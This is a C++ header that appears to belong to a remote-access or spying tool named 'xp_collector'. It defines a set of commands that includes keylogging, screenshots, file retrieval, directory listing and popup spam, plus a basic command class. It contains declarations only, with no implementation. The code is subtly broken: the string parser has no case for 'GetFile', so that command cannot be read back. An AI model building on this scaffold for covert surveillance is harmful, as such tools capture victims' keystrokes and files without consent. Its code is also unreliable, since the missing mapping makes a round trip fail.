#pragma once
#include <string>
#include <stdexcept>

namespace xp_collector
{
enum class CommandType
{
	Popup,
	PopupSpam,
	Screenshot,
	KeyLog,
	GetSystemInfo,
	GetFile,
	DirList,
	PlaySoundCommand,
	DisplayImage,
	Uninstall,
	Unknown
};

inline std::string to_string(const CommandType val)
{
	switch (val) {
	case CommandType::Popup: return "Popup";
	case CommandType::PopupSpam: return "PopupSpam";
	case CommandType::Screenshot: return "Screenshot";
	case CommandType::KeyLog: return "KeyLog";
	case CommandType::GetSystemInfo: return "GetSystemInfo";
	case CommandType::GetFile: return "GetFile";
	case CommandType::DirList: return "DirList";
	case CommandType::PlaySoundCommand: return "PlaySound";
	case CommandType::DisplayImage: return "DisplayImage";
	case CommandType::Uninstall: return "Uninstall";
	case CommandType::Unknown: return "Unknown";
	default: throw std::invalid_argument("Unmapped to_string enum in CommandType");
	}
}

inline CommandType ct_from_string(const std::string& val)
{
	if ("Popup" == val) return CommandType::Popup;
	if ("PopupSpam" == val) return CommandType::PopupSpam;
	if ("Screenshot" == val) return CommandType::Screenshot;
	if ("KeyLog" == val) return CommandType::KeyLog;
	if ("GetSystemInfo" == val) return CommandType::GetSystemInfo;
	if ("DirList" == val) return CommandType::DirList;
	if ("PlaySound" == val) return CommandType::PlaySoundCommand;
	if ("DisplayImage" == val) return CommandType::DisplayImage;
	if ("Uninstall" == val) return CommandType::Uninstall;
	if ("Unknown" == val) return CommandType::Unknown;
	throw std::invalid_argument("Invalid argument '" + val + "' when trying to parse CommandType enum");
}

class BasicCommand
{
public:
	BasicCommand(std::string command_id, CommandType command_type);

	[[nodiscard]] std::string get_command_id() const;

	[[nodiscard]] CommandType get_command_type() const;

protected:
	std::string m_command_id;
	CommandType m_command_type;
};
}
